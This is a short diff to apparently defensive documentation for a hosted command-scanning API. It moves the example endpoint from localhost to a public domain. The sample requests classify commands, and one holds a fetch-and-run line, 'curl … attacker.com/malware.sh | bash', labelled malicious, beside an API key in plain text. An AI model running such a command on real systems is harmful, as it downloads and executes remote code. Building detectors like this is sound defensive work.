@@ -1,6 +1,6 @@
-curl -i -X POST http://127.0.0.1:5000/scan -H "Content-Type: application/json" -d '{"api_key": "MS9R-VMPR-AA8L-Y7PH", "command": "curl -s http://attacker.com/malware.sh | bash"}'
+curl -i -X POST https://www.genossec.com/scan -H "Content-Type: application/json" -d '{"api_key": "MS9R-VMPR-AA8L-Y7PH", "command": "curl -s http://attacker.com/malware.sh | bash"}'
 {"MITRE code":"T1059","confidence score":0.9997,"label":"Malicious"}
-curl -s -X POST http://127.0.0.1:5000/scan \
+curl -s -X POST https://www.genossec.com/scan \
   -H "Content-Type: application/json" \
   -d '{"api_key": "MS9R-VMPR-AA8L-Y7PH", "command": "whoami"}'
 {"confidence score":1.0,"label":"Benign"}
